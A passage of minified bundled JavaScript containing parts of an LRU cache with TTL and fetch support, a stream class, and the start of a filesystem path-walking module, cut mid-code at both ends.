H=setTimeout(()=>{if(this.#C(W))this.#$(this.#U[W],"expire")},z+1);if(H.unref)H.unref()}},this.#_=(W)=>{J[W]=X[W]!==0?this.#V.now():0},this.#I=(W,z)=>{if(X[z]){let G=X[z],H=J[z];if(!G||!H)return;W.ttl=G,W.start=H,W.now=Q||Y();let U=W.now-H;W.remainingTTL=G-U}};let Q=0,Y=()=>{let W=this.#V.now();if(this.ttlResolution>0){Q=W;let z=setTimeout(()=>Q=0,this.ttlResolution);if(z.unref)z.unref()}return W};this.getRemainingTTL=(W)=>{let z=this.#B.get(W);if(z===void 0)return 0;let G=X[z],H=J[z];if(!G||!H)return 1/0;let U=(Q||Y())-H;return G-U},this.#C=(W)=>{let z=J[W],G=X[W];return!!G&&!!z&&(Q||Y())-z>G}}#_=()=>{};#I=()=>{};#u=()=>{};#C=()=>!1;#h(){let X=new OQ(this.#X);this.#q=0,this.#w=X,this.#v=(J)=>{this.#q-=X[J],X[J]=0},this.#x=(J,Q,Y,W)=>{if(this.#K(Q))return 0;if(!KX(Y))if(W){if(typeof W!=="function")throw new TypeError("sizeCalculation must be a function");if(Y=W(Q,J),!KX(Y))throw new TypeError("sizeCalculation return invalid (expect positive integer)")}else throw new TypeError("invalid size value (must be positive integer). When maxSize or maxEntrySize is used, sizeCalculation or size must be set.");return Y},this.#y=(J,Q,Y)=>{if(X[J]=Q,this.#J){let W=this.#J-X[J];while(this.#q>W)this.#f(!0)}if(this.#q+=X[J],Y)Y.entrySize=Q,Y.totalCalculatedSize=this.#q}}#v=(X)=>{};#y=(X,J,Q)=>{};#x=(X,J,Q,Y)=>{if(Q||Y)throw new TypeError("cannot set size without setting maxSize or maxEntrySize on cache");return 0};*#E({allowStale:X=this.allowStale}={}){if(this.#H)for(let J=this.#F;;){if(!this.#c(J))break;if(X||!this.#C(J))yield J;if(J===this.#A)break;else J=this.#L[J]}}*#k({allowStale:X=this.allowStale}={}){if(this.#H)for(let J=this.#A;;){if(!this.#c(J))break;if(X||!this.#C(J))yield J;if(J===this.#F)break;else J=this.#M[J]}}#c(X){return X!==void 0&&this.#B.get(this.#U[X])===X}*entries(){for(let X of this.#E())if(this.#Q[X]!==void 0&&this.#U[X]!==void 0&&!this.#K(this.#Q[X]))yield[this.#U[X],this.#Q[X]]}*rentries(){for(let X of this.#k())if(this.#Q[X]!==void 0&&this.#U[X]!==void 0&&!this.#K(this.#Q[X]))yield[this.#U[X],this.#Q[X]]}*keys(){for(let X of this.#E()){let J=this.#U[X];if(J!==void 0&&!this.#K(this.#Q[X]))yield J}}*rkeys(){for(let X of this.#k()){let J=this.#U[X];if(J!==void 0&&!this.#K(this.#Q[X]))yield J}}*values(){for(let X of this.#E())if(this.#Q[X]!==void 0&&!this.#K(this.#Q[X]))yield this.#Q[X]}*rvalues(){for(let X of this.#k())if(this.#Q[X]!==void 0&&!this.#K(this.#Q[X]))yield this.#Q[X]}[Symbol.iterator](){return this.entries()}[Symbol.toStringTag]="LRUCache";find(X,J={}){for(let Q of this.#E()){let Y=this.#Q[Q],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;if(X(W,this.#U[Q],this))return this.get(this.#U[Q],J)}}forEach(X,J=this){for(let Q of this.#E()){let Y=this.#Q[Q],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;X.call(J,W,this.#U[Q],this)}}rforEach(X,J=this){for(let Q of this.#k()){let Y=this.#Q[Q],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;X.call(J,W,this.#U[Q],this)}}purgeStale(){let X=!1;for(let J of this.#k({allowStale:!0}))if(this.#C(J))this.#$(this.#U[J],"expire"),X=!0;return X}info(X){let J=this.#B.get(X);if(J===void 0)return;let Q=this.#Q[J],Y=this.#K(Q)?Q.__staleWhileFetching:Q;if(Y===void 0)return;let W={value:Y};if(this.#O&&this.#P){let z=this.#O[J],G=this.#P[J];if(z&&G){let H=z-(this.#V.now()-G);W.ttl=H,W.start=Date.now()}}if(this.#w)W.size=this.#w[J];return W}dump(){let X=[];for(let J of this.#E({allowStale:!0})){let Q=this.#U[J],Y=this.#Q[J],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0||Q===void 0)continue;let z={value:W};if(this.#O&&this.#P){z.ttl=this.#O[J];let G=this.#V.now()-this.#P[J];z.start=Math.floor(Date.now()-G)}if(this.#w)z.size=this.#w[J];X.unshift([Q,z])}return X}load(X){this.clear();for(let[J,Q]of X){if(Q.start){let Y=Date.now()-Q.start;Q.start=this.#V.now()-Y}this.set(J,Q.value,Q)}}set(X,J,Q={}){if(J===void 0)return this.delete(X),this;let{ttl:Y=this.ttl,start:W,noDisposeOnSet:z=this.noDisposeOnSet,sizeCalculation:G=this.sizeCalculation,status:H}=Q,{noUpdateTTL:U=this.noUpdateTTL}=Q,K=this.#x(X,J,Q.size||0,G);if(this.maxEntrySize&&K>this.maxEntrySize){if(H)H.set="miss",H.maxEntrySizeExceeded=!0;return this.#$(X,"set"),this}let V=this.#H===0?void 0:this.#B.get(X);if(V===void 0){if(V=this.#H===0?this.#F:this.#T.length!==0?this.#T.pop():this.#H===this.#X?this.#f(!1):this.#H,this.#U[V]=X,this.#Q[V]=J,this.#B.set(X,V),this.#M[this.#F]=V,this.#L[V]=this.#F,this.#F=V,this.#H++,this.#y(V,K,H),H)H.set="add";if(U=!1,this.#Y)this.#W?.(J,X,"add")}else{this.#g(V);let B=this.#Q[V];if(J!==B){if(this.#S&&this.#K(B)){B.__abortController.abort(new Error("replaced"));let{__staleWhileFetching:Z}=B;if(Z!==void 0&&!z){if(this.#D)this.#G?.(Z,X,"set");if(this.#Z)this.#j?.push([Z,X,"set"])}}else if(!z){if(this.#D)this.#G?.(B,X,"set");if(this.#Z)this.#j?.push([B,X,"set"])}if(this.#v(V),this.#y(V,K,H),this.#Q[V]=J,H){H.set="replace";let Z=B&&this.#K(B)?B.__staleWhileFetching:B;if(Z!==void 0)H.oldValue=Z}}else if(H)H.set="update";if(this.#Y)this.onInsert?.(J,X,J===B?"update":"replace")}if(Y!==0&&!this.#O)this.#b();if(this.#O){if(!U)this.#u(V,Y,W);if(H)this.#I(H,V)}if(!z&&this.#Z&&this.#j){let B=this.#j,Z;while(Z=B?.shift())this.#z?.(...Z)}return this}pop(){try{while(this.#H){let X=this.#Q[this.#A];if(this.#f(!0),this.#K(X)){if(X.__staleWhileFetching)return X.__staleWhileFetching}else if(X!==void 0)return X}}finally{if(this.#Z&&this.#j){let X=this.#j,J;while(J=X?.shift())this.#z?.(...J)}}}#f(X){let J=this.#A,Q=this.#U[J],Y=this.#Q[J];if(this.#S&&this.#K(Y))Y.__abortController.abort(new Error("evicted"));else if(this.#D||this.#Z){if(this.#D)this.#G?.(Y,Q,"evict");if(this.#Z)this.#j?.push([Y,Q,"evict"])}if(this.#v(J),X)this.#U[J]=void 0,this.#Q[J]=void 0,this.#T.push(J);if(this.#H===1)this.#A=this.#F=0,this.#T.length=0;else this.#A=this.#M[J];return this.#B.delete(Q),this.#H--,J}has(X,J={}){let{updateAgeOnHas:Q=this.updateAgeOnHas,status:Y}=J,W=this.#B.get(X);if(W!==void 0){let z=this.#Q[W];if(this.#K(z)&&z.__staleWhileFetching===void 0)return!1;if(!this.#C(W)){if(Q)this.#_(W);if(Y)Y.has="hit",this.#I(Y,W);return!0}else if(Y)Y.has="stale",this.#I(Y,W)}else if(Y)Y.has="miss";return!1}peek(X,J={}){let{allowStale:Q=this.allowStale}=J,Y=this.#B.get(X);if(Y===void 0||!Q&&this.#C(Y))return;let W=this.#Q[Y];return this.#K(W)?W.__staleWhileFetching:W}#l(X,J,Q,Y){let W=J===void 0?void 0:this.#Q[J];if(this.#K(W))return W;let z=new I2,{signal:G}=Q;G?.addEventListener("abort",()=>z.abort(G.reason),{signal:z.signal});let H={signal:z.signal,options:Q,context:Y},U=(F,j=!1)=>{let{aborted:O}=z.signal,N=Q.ignoreFetchAbort&&F!==void 0;if(Q.status)if(O&&!j){if(Q.status.fetchAborted=!0,Q.status.fetchError=z.signal.reason,N)Q.status.fetchAbortIgnored=!0}else Q.status.fetchResolved=!0;if(O&&!N&&!j)return V(z.signal.reason);let A=Z;if(this.#Q[J]===Z)if(F===void 0)if(A.__staleWhileFetching!==void 0)this.#Q[J]=A.__staleWhileFetching;else this.#$(X,"fetch");else{if(Q.status)Q.status.fetchUpdated=!0;this.set(X,F,H.options)}return F},K=(F)=>{if(Q.status)Q.status.fetchRejected=!0,Q.status.fetchError=F;return V(F)},V=(F)=>{let{aborted:j}=z.signal,O=j&&Q.allowStaleOnFetchAbort,N=O||Q.allowStaleOnFetchRejection,A=N||Q.noDeleteOnFetchRejection,D=Z;if(this.#Q[J]===Z){if(!A||D.__staleWhileFetching===void 0)this.#$(X,"fetch");else if(!O)this.#Q[J]=D.__staleWhileFetching}if(N){if(Q.status&&D.__staleWhileFetching!==void 0)Q.status.returnedStale=!0;return D.__staleWhileFetching}else if(D.__returned===D)throw F},B=(F,j)=>{let O=this.#N?.(X,W,H);if(O&&O instanceof Promise)O.then((N)=>F(N===void 0?void 0:N),j);z.signal.addEventListener("abort",()=>{if(!Q.ignoreFetchAbort||Q.allowStaleOnFetchAbort){if(F(void 0),Q.allowStaleOnFetchAbort)F=(N)=>U(N,!0)}})};if(Q.status)Q.status.fetchDispatched=!0;let Z=new Promise(B).then(U,K),M=Object.assign(Z,{__abortController:z,__staleWhileFetching:W,__returned:void 0});if(J===void 0)this.set(X,M,{...H.options,status:void 0}),J=this.#B.get(X);else this.#Q[J]=M;return M}#K(X){if(!this.#S)return!1;let J=X;return!!J&&J instanceof Promise&&J.hasOwnProperty("__staleWhileFetching")&&J.__abortController instanceof I2}async fetch(X,J={}){let{allowStale:Q=this.allowStale,updateAgeOnGet:Y=this.updateAgeOnGet,noDeleteOnStaleGet:W=this.noDeleteOnStaleGet,ttl:z=this.ttl,noDisposeOnSet:G=this.noDisposeOnSet,size:H=0,sizeCalculation:U=this.sizeCalculation,noUpdateTTL:K=this.noUpdateTTL,noDeleteOnFetchRejection:V=this.noDeleteOnFetchRejection,allowStaleOnFetchRejection:B=this.allowStaleOnFetchRejection,ignoreFetchAbort:Z=this.ignoreFetchAbort,allowStaleOnFetchAbort:M=this.allowStaleOnFetchAbort,context:F,forceRefresh:j=!1,status:O,signal:N}=J;if(!this.#S){if(O)O.fetch="get";return this.get(X,{allowStale:Q,updateAgeOnGet:Y,noDeleteOnStaleGet:W,status:O})}let A={allowStale:Q,updateAgeOnGet:Y,noDeleteOnStaleGet:W,ttl:z,noDisposeOnSet:G,size:H,sizeCalculation:U,noUpdateTTL:K,noDeleteOnFetchRejection:V,allowStaleOnFetchRejection:B,allowStaleOnFetchAbort:M,ignoreFetchAbort:Z,status:O,signal:N},D=this.#B.get(X);if(D===void 0){if(O)O.fetch="miss";let S=this.#l(X,D,A,F);return S.__returned=S}else{let S=this.#Q[D];if(this.#K(S)){let y=Q&&S.__staleWhileFetching!==void 0;if(O){if(O.fetch="inflight",y)O.returnedStale=!0}return y?S.__staleWhileFetching:S.__returned=S}let $=this.#C(D);if(!j&&!$){if(O)O.fetch="hit";if(this.#g(D),Y)this.#_(D);if(O)this.#I(O,D);return S}let T=this.#l(X,D,A,F),E=T.__staleWhileFetching!==void 0&&Q;if(O){if(O.fetch=$?"stale":"refresh",E&&$)O.returnedStale=!0}return E?T.__staleWhileFetching:T.__returned=T}}async forceFetch(X,J={}){let Q=await this.fetch(X,J);if(Q===void 0)throw new Error("fetch() returned undefined");return Q}memo(X,J={}){let Q=this.#R;if(!Q)throw new Error("no memoMethod provided to constructor");let{context:Y,forceRefresh:W,...z}=J,G=this.get(X,z);if(!W&&G!==void 0)return G;let H=Q(X,G,{options:z,context:Y});return this.set(X,H,z),H}get(X,J={}){let{allowStale:Q=this.allowStale,updateAgeOnGet:Y=this.updateAgeOnGet,noDeleteOnStaleGet:W=this.noDeleteOnStaleGet,status:z}=J,G=this.#B.get(X);if(G!==void 0){let H=this.#Q[G],U=this.#K(H);if(z)this.#I(z,G);if(this.#C(G)){if(z)z.get="stale";if(!U){if(!W)this.#$(X,"expire");if(z&&Q)z.returnedStale=!0;return Q?H:void 0}else{if(z&&Q&&H.__staleWhileFetching!==void 0)z.returnedStale=!0;return Q?H.__staleWhileFetching:void 0}}else{if(z)z.get="hit";if(U)return H.__staleWhileFetching;if(this.#g(G),Y)this.#_(G);return H}}else if(z)z.get="miss"}#p(X,J){this.#L[J]=X,this.#M[X]=J}#g(X){if(X!==this.#F){if(X===this.#A)this.#A=this.#M[X];else this.#p(this.#L[X],this.#M[X]);this.#p(this.#F,X),this.#F=X}}delete(X){return this.#$(X,"delete")}#$(X,J){let Q=!1;if(this.#H!==0){let Y=this.#B.get(X);if(Y!==void 0)if(Q=!0,this.#H===1)this.#m(J);else{this.#v(Y);let W=this.#Q[Y];if(this.#K(W))W.__abortController.abort(new Error("deleted"));else if(this.#D||this.#Z){if(this.#D)this.#G?.(W,X,J);if(this.#Z)this.#j?.push([W,X,J])}if(this.#B.delete(X),this.#U[Y]=void 0,this.#Q[Y]=void 0,Y===this.#F)this.#F=this.#L[Y];else if(Y===this.#A)this.#A=this.#M[Y];else{let z=this.#L[Y];this.#M[z]=this.#M[Y];let G=this.#M[Y];this.#L[G]=this.#L[Y]}this.#H--,this.#T.push(Y)}}if(this.#Z&&this.#j?.length){let Y=this.#j,W;while(W=Y?.shift())this.#z?.(...W)}return Q}clear(){return this.#m("delete")}#m(X){for(let J of this.#k({allowStale:!0})){let Q=this.#Q[J];if(this.#K(Q))Q.__abortController.abort(new Error("deleted"));else{let Y=this.#U[J];if(this.#D)this.#G?.(Q,Y,X);if(this.#Z)this.#j?.push([Q,Y,X])}}if(this.#B.clear(),this.#Q.fill(void 0),this.#U.fill(void 0),this.#O&&this.#P)this.#O.fill(0),this.#P.fill(0);if(this.#w)this.#w.fill(0);if(this.#A=0,this.#F=0,this.#T.length=0,this.#q=0,this.#H=0,this.#Z&&this.#j){let J=this.#j,Q;while(Q=J?.shift())this.#z?.(...Q)}}}});import{EventEmitter as gH}from"node:events";import XD from"node:stream";import{StringDecoder as bm1}from"node:string_decoder";class hH{src;dest;opts;ondrain;constructor(X,J,Q){this.src=X,this.dest=J,this.opts=Q,this.ondrain=()=>X[S7](),this.dest.on("drain",this.ondrain)}unpipe(){this.dest.removeListener("drain",this.ondrain)}proxyErrors(X){}end(){if(this.unpipe(),this.opts.end)this.dest.end()}}var sL,vm1=(X)=>!!X&&typeof X==="object"&&(X instanceof XJ||X instanceof XD||xm1(X)||fm1(X)),xm1=(X)=>!!X&&typeof X==="object"&&X instanceof gH&&typeof X.pipe==="function"&&X.pipe!==XD.Writable.prototype.pipe,fm1=(X)=>!!X&&typeof X==="object"&&X instanceof gH&&typeof X.write==="function"&&typeof X.end==="function",k6,b6,VX,C2,AQ,P2,oL,S2,tL,f8,P7,U9,NQ,S7,K9,b9,V9,kH,T2,N9,e0,bH,vH,eL,xH,z6,fH,_2,LQ,eX,o9,DQ=(X)=>Promise.resolve().then(X),gm1=(X)=>X(),hm1=(X)=>X==="end"||X==="finish"||X==="prefinish",ym1=(X)=>X instanceof ArrayBuffer||!!X&&typeof X==="object"&&X.constructor&&X.constructor.name==="ArrayBuffer"&&X.byteLength>=0,mm1=(X)=>!Buffer.isBuffer(X)&&ArrayBuffer.isView(X),JD,um1=(X)=>!!X.objectMode,cm1=(X)=>!X.objectMode&&!!X.encoding&&X.encoding!=="buffer",XJ;var yH=j1(()=>{sL=typeof process==="object"&&process?process:{stdout:null,stderr:null},k6=Symbol("EOF"),b6=Symbol("maybeEmitEnd"),VX=Symbol("emittedEnd"),C2=Symbol("emittingEnd"),AQ=Symbol("emittedError"),P2=Symbol("closed"),oL=Symbol("read"),S2=Symbol("flush"),tL=Symbol("flushChunk"),f8=Symbol("encoding"),P7=Symbol("decoder"),U9=Symbol("flowing"),NQ=Symbol("paused"),S7=Symbol("resume"),K9=Symbol("buffer"),b9=Symbol("pipes"),V9=Symbol("bufferLength"),kH=Symbol("bufferPush"),T2=Symbol("bufferShift"),N9=Symbol("objectMode"),e0=Symbol("destroyed"),bH=Symbol("error"),vH=Symbol("emitData"),eL=Symbol("emitEnd"),xH=Symbol("emitEnd2"),z6=Symbol("async"),fH=Symbol("abort"),_2=Symbol("aborted"),LQ=Symbol("signal"),eX=Symbol("dataListeners"),o9=Symbol("discarded");JD=class JD extends hH{unpipe(){this.src.removeListener("error",this.proxyErrors),super.unpipe()}constructor(X,J,Q){super(X,J,Q);this.proxyErrors=(Y)=>J.emit("error",Y),X.on("error",this.proxyErrors)}};XJ=class XJ extends gH{[U9]=!1;[NQ]=!1;[b9]=[];[K9]=[];[N9];[f8];[z6];[P7];[k6]=!1;[VX]=!1;[C2]=!1;[P2]=!1;[AQ]=null;[V9]=0;[e0]=!1;[LQ];[_2]=!1;[eX]=0;[o9]=!1;writable=!0;readable=!0;constructor(...X){let J=X[0]||{};super();if(J.objectMode&&typeof J.encoding==="string")throw new TypeError("Encoding and objectMode may not be used together");if(um1(J))this[N9]=!0,this[f8]=null;else if(cm1(J))this[f8]=J.encoding,this[N9]=!1;else this[N9]=!1,this[f8]=null;if(this[z6]=!!J.async,this[P7]=this[f8]?new bm1(this[f8]):null,J&&J.debugExposeBuffer===!0)Object.defineProperty(this,"buffer",{get:()=>this[K9]});if(J&&J.debugExposePipes===!0)Object.defineProperty(this,"pipes",{get:()=>this[b9]});let{signal:Q}=J;if(Q)if(this[LQ]=Q,Q.aborted)this[fH]();else Q.addEventListener("abort",()=>this[fH]())}get bufferLength(){return this[V9]}get encoding(){return this[f8]}set encoding(X){throw new Error("Encoding must be set at instantiation time")}setEncoding(X){throw new Error("Encoding must be set at instantiation time")}get objectMode(){return this[N9]}set objectMode(X){throw new Error("objectMode must be set at instantiation time")}get["async"](){return this[z6]}set["async"](X){this[z6]=this[z6]||!!X}[fH](){this[_2]=!0,this.emit("abort",this[LQ]?.reason),this.destroy(this[LQ]?.reason)}get aborted(){return this[_2]}set aborted(X){}write(X,J,Q){if(this[_2])return!1;if(this[k6])throw new Error("write after end");if(this[e0])return this.emit("error",Object.assign(new Error("Cannot call write after a stream was destroyed"),{code:"ERR_STREAM_DESTROYED"})),!0;if(typeof J==="function")Q=J,J="utf8";if(!J)J="utf8";let Y=this[z6]?DQ:gm1;if(!this[N9]&&!Buffer.isBuffer(X)){if(mm1(X))X=Buffer.from(X.buffer,X.byteOffset,X.byteLength);else if(ym1(X))X=Buffer.from(X);else if(typeof X!=="string")throw new Error("Non-contiguous data written to non-objectMode stream")}if(this[N9]){if(this[U9]&&this[V9]!==0)this[S2](!0);if(this[U9])this.emit("data",X);else this[kH](X);if(this[V9]!==0)this.emit("readable");if(Q)Y(Q);return this[U9]}if(!X.length){if(this[V9]!==0)this.emit("readable");if(Q)Y(Q);return this[U9]}if(typeof X==="string"&&!(J===this[f8]&&!this[P7]?.lastNeed))X=Buffer.from(X,J);if(Buffer.isBuffer(X)&&this[f8])X=this[P7].write(X);if(this[U9]&&this[V9]!==0)this[S2](!0);if(this[U9])this.emit("data",X);else this[kH](X);if(this[V9]!==0)this.emit("readable");if(Q)Y(Q);return this[U9]}read(X){if(this[e0])return null;if(this[o9]=!1,this[V9]===0||X===0||X&&X>this[V9])return this[b6](),null;if(this[N9])X=null;if(this[K9].length>1&&!this[N9])this[K9]=[this[f8]?this[K9].join(""):Buffer.concat(this[K9],this[V9])];let J=this[oL](X||null,this[K9][0]);return this[b6](),J}[oL](X,J){if(this[N9])this[T2]();else{let Q=J;if(X===Q.length||X===null)this[T2]();else if(typeof Q==="string")this[K9][0]=Q.slice(X),J=Q.slice(0,X),this[V9]-=X;else this[K9][0]=Q.subarray(X),J=Q.subarray(0,X),this[V9]-=X}if(this.emit("data",J),!this[K9].length&&!this[k6])this.emit("drain");return J}end(X,J,Q){if(typeof X==="function")Q=X,X=void 0;if(typeof J==="function")Q=J,J="utf8";if(X!==void 0)this.write(X,J);if(Q)this.once("end",Q);if(this[k6]=!0,this.writable=!1,this[U9]||!this[NQ])this[b6]();return this}[S7](){if(this[e0])return;if(!this[eX]&&!this[b9].length)this[o9]=!0;if(this[NQ]=!1,this[U9]=!0,this.emit("resume"),this[K9].length)this[S2]();else if(this[k6])this[b6]();else this.emit("drain")}resume(){return this[S7]()}pause(){this[U9]=!1,this[NQ]=!0,this[o9]=!1}get destroyed(){return this[e0]}get flowing(){return this[U9]}get paused(){return this[NQ]}[kH](X){if(this[N9])this[V9]+=1;else this[V9]+=X.length;this[K9].push(X)}[T2](){if(this[N9])this[V9]-=1;else this[V9]-=this[K9][0].length;return this[K9].shift()}[S2](X=!1){do;while(this[tL](this[T2]())&&this[K9].length);if(!X&&!this[K9].length&&!this[k6])this.emit("drain")}[tL](X){return this.emit("data",X),this[U9]}pipe(X,J){if(this[e0])return X;this[o9]=!1;let Q=this[VX];if(J=J||{},X===sL.stdout||X===sL.stderr)J.end=!1;else J.end=J.end!==!1;if(J.proxyErrors=!!J.proxyErrors,Q){if(J.end)X.end()}else if(this[b9].push(!J.proxyErrors?new hH(this,X,J):new JD(this,X,J)),this[z6])DQ(()=>this[S7]());else this[S7]();return X}unpipe(X){let J=this[b9].find((Q)=>Q.dest===X);if(J){if(this[b9].length===1){if(this[U9]&&this[eX]===0)this[U9]=!1;this[b9]=[]}else this[b9].splice(this[b9].indexOf(J),1);J.unpipe()}}addListener(X,J){return this.on(X,J)}on(X,J){let Q=super.on(X,J);if(X==="data"){if(this[o9]=!1,this[eX]++,!this[b9].length&&!this[U9])this[S7]()}else if(X==="readable"&&this[V9]!==0)super.emit("readable");else if(hm1(X)&&this[VX])super.emit(X),this.removeAllListeners(X);else if(X==="error"&&this[AQ]){let Y=J;if(this[z6])DQ(()=>Y.call(this,this[AQ]));else Y.call(this,this[AQ])}return Q}removeListener(X,J){return this.off(X,J)}off(X,J){let Q=super.off(X,J);if(X==="data"){if(this[eX]=this.listeners("data").length,this[eX]===0&&!this[o9]&&!this[b9].length)this[U9]=!1}return Q}removeAllListeners(X){let J=super.removeAllListeners(X);if(X==="data"||X===void 0){if(this[eX]=0,!this[o9]&&!this[b9].length)this[U9]=!1}return J}get emittedEnd(){return this[VX]}[b6](){if(!this[C2]&&!this[VX]&&!this[e0]&&this[K9].length===0&&this[k6]){if(this[C2]=!0,this.emit("end"),this.emit("prefinish"),this.emit("finish"),this[P2])this.emit("close");this[C2]=!1}}emit(X,...J){let Q=J[0];if(X!=="error"&&X!=="close"&&X!==e0&&this[e0])return!1;else if(X==="data")return!this[N9]&&!Q?!1:this[z6]?(DQ(()=>this[vH](Q)),!0):this[vH](Q);else if(X==="end")return this[eL]();else if(X==="close"){if(this[P2]=!0,!this[VX]&&!this[e0])return!1;let W=super.emit("close");return this.removeAllListeners("close"),W}else if(X==="error"){this[AQ]=Q,super.emit(bH,Q);let W=!this[LQ]||this.listeners("error").length?super.emit("error",Q):!1;return this[b6](),W}else if(X==="resume"){let W=super.emit("resume");return this[b6](),W}else if(X==="finish"||X==="prefinish"){let W=super.emit(X);return this.removeAllListeners(X),W}let Y=super.emit(X,...J);return this[b6](),Y}[vH](X){for(let Q of this[b9])if(Q.dest.write(X)===!1)this.pause();let J=this[o9]?!1:super.emit("data",X);return this[b6](),J}[eL](){if(this[VX])return!1;return this[VX]=!0,this.readable=!1,this[z6]?(DQ(()=>this[xH]()),!0):this[xH]()}[xH](){if(this[P7]){let J=this[P7].end();if(J){for(let Q of this[b9])Q.dest.write(J);if(!this[o9])super.emit("data",J)}}for(let J of this[b9])J.end();let X=super.emit("end");return this.removeAllListeners("end"),X}async collect(){let X=Object.assign([],{dataLength:0});if(!this[N9])X.dataLength=0;let J=this.promise();return this.on("data",(Q)=>{if(X.push(Q),!this[N9])X.dataLength+=Q.length}),await J,X}async concat(){if(this[N9])throw new Error("cannot concat in objectMode");let X=await this.collect();return this[f8]?X.join(""):Buffer.concat(X,X.dataLength)}async promise(){return new Promise((X,J)=>{this.on(e0,()=>J(new Error("stream destroyed"))),this.on("error",(Q)=>J(Q)),this.on("end",()=>X())})}[Symbol.asyncIterator](){this[o9]=!1;let X=!1,J=async()=>{return this.pause(),X=!0,{value:void 0,done:!0}};return{next:()=>{if(X)return J();let Y=this.read();if(Y!==null)return Promise.resolve({done:!1,value:Y});if(this[k6])return J();let W,z,G=(V)=>{this.off("data",H),this.off("end",U),this.off(e0,K),J(),z(V)},H=(V)=>{this.off("error",G),this.off("end",U),this.off(e0,K),this.pause(),W({value:V,done:!!this[k6]})},U=()=>{this.off("error",G),this.off("data",H),this.off(e0,K),J(),W({done:!0,value:void 0})},K=()=>G(new Error("stream destroyed"));return new Promise((V,B)=>{z=B,W=V,this.once(e0,K),this.once("error",G),this.once("end",U),this.once("data",H)})},throw:J,return:J,[Symbol.asyncIterator](){return this}}}[Symbol.iterator](){this[o9]=!1;let X=!1,J=()=>{return this.pause(),this.off(bH,J),this.off(e0,J),this.off("end",J),X=!0,{done:!0,value:void 0}},Q=()=>{if(X)return J();let Y=this.read();return Y===null?J():{done:!1,value:Y}};return this.once("end",J),this.once(bH,J),this.once(e0,J),{next:Q,throw:J,return:J,[Symbol.iterator](){return this}}}destroy(X){if(this[e0]){if(X)this.emit("error",X);else this.emit(e0);return this}this[e0]=!0,this[o9]=!0,this[K9].length=0,this[V9]=0;let J=this;if(typeof J.close==="function"&&!this[P2])J.close();if(X)this.emit("error",X);else this.emit(e0);return this}static get isStream(){return vm1}}});import{posix as lm1,win32 as cH}from"node:path";import{fileURLToPath as pm1}from"node:url";import{lstatSync as dm1,readdir as im1,readdirSync as rm1,readlinkSync as nm1,realpathSync as am1}from"fs";import*as sm1 from"node:fs";import{lstat as tm1,readdir as em1,readlink as Xu1,realpath as Ju1}from"node:fs/promises";var om1,IQ,zD=(X)=>!X||X===IQ||X===sm1?IQ:{...IQ,...X,promises:{...IQ.promises,...X.promises||{}}},HD,Qu1=(X)=>X.replace(/\//g,"\\").replace(HD,"$1\\"),Yu1,F8=0,UD=1,KD=2,H6=4,VD=6,BD=8,JJ=10,qD=12,M8=15,wQ,mH=16,QD=32,CQ=64,g8=128,E2=256,k2=512,YD,Wu1=1023,uH=(X)=>X.isFile()?BD:X.isDirectory()?H6:X.isSymbolicLink()?JJ:X.isCharacterDevice()?KD:X.isBlockDevice()?VD:X.isSocket()?qD:X.isFIFO()?UD:F8,WD,PQ=(X)=>{let J=WD.get(X);if(J)return J;let Q=X.normalize("NFKD");return WD.set(X,Q),Q},GD,$2=(X)=>{let J=GD.get(X);if(J)return J;let Q=PQ(X.toLowerCase());return GD.set(X,Q),Q},lH,ZD,MD,v9,b2,v2,pH,SQ,TQ,x2,r60,FD;var jD=j1(()=>{aL();yH();om1=am1.native,IQ={lstatSync:dm1,readdir:im1,readdirSync:rm1,readlinkSync:nm1,realpathSync:om1,promises:{lstat:tm1,readdir:em1,readlink:Xu1,realpath:Ju1}},HD=/^\\\\\?\\([a-z]:)\\?$/i,Yu1=/[\\\/]/,wQ=~M8,YD=CQ|g8|k2,WD=new Map,GD=new Map;lH=class lH extends RQ{constructor(){super({max:256})}};ZD=class ZD extends RQ{constructor(X=16384){super({maxSize:X,sizeCalculation:(J)=>J.length+1})}};MD=Symbol("PathScurry setAsCwd");v9=class v9{name;root;roots;parent;nocase;isCWD=!1;#X;#J;get dev(){return this.#J}#G;get mode(){return this.#G}#W;get nlink(){return this.#W}#z;get uid(){return this.#z}#N;get gid(){return this.#N}#R;get rdev(){return this.#R}#V;get blksize(){return this.#V}#H;get ino(){return this.#H}#q;get size(){return this.#q}#B;get blocks(){return this.#B}#U;get atimeMs(){return this.#U}#Q;get mtimeMs(){return this.#Q}#M;get ctimeMs(){return this.#M}#L;get birthtimeMs(){return this.#L}#A;get atime(){return this.#A}#F;get mtime(){return this.#F}#T;get ctime(){return this.#T}#j;get birthtime(){return this.#j}#w;#P;#O;#D;#S;#Z;#Y;#b;#_;#I;get parentPath(){return(this.parent||this).fullpath()}get path(){return this.parentPath}constructor(X,J=F8,Q,Y,W,z,G){if(this.name=X,this.#w=W?$2(X):PQ(X),this.#Y=J&Wu1,this.nocase=W,this.roots=Y,this.root=Q||this,this.#b=z,this.#O=G.fullpath,this.#S=G.relative,this.#Z=G.relativePosix,this.parent=G.parent,this.parent)this.#X=this.parent.#X;else this.#X=zD(G.fs)}depth(){if(this.#P!==void 0)return this.#P;if(!this.parent)return this.#P=0;return this.#P=this.parent.depth()+1}childrenCache(){return this.#b}resolve(X){if(!X)return this;let J=this.getRootString(X),Y=X.substring(J.length).split(this.splitSep);return J?this.getRoot(J).#u(Y):this.#u(Y)}#u(X){let J=this;for(let Q of X)J=J.child(Q);return J}children(){let X=this.#b.get(this);if(X)return X;let J=Object.assign([],{provisional:0});return this.#b.set(this,J),this.#Y&=~mH,J}child(X,J){if(X===""||X===".")return this;if(X==="..")return this.parent||this;let Q=this.children(),Y=this.nocase?$2(X):PQ(X);for(let H of Q)if(H.#w===Y)return H;let W=this.parent?this.sep:"",z=this.#O?this.#O+W+X:void 0,G=this.newChild(X,F8,{...J,parent:this,fullpath:z});if(!this.canReaddir())G.#Y|=g8;return Q.push(G),G}relative(){if(this.isCWD)return"";if(this.#S!==void 0)return this.#S;let X=this.name,J=this.parent;if(!J)return this.#S=this.name;let Q=J.relative();return Q+(!Q||!J.parent?"":this.sep)+X}relativePosix(){if(this.sep==="/")return this.relative();if(this.isCWD)return"";if(this.#Z!==void 0)return this.#Z;let X=this.name,J=this.parent;if(!J)return this.#Z=this.fullpathPosix();let Q=J.relativePosix();return Q+(!Q||!J.parent?"":"/")+X}fullpath(){if(this.#O!==void 0)return 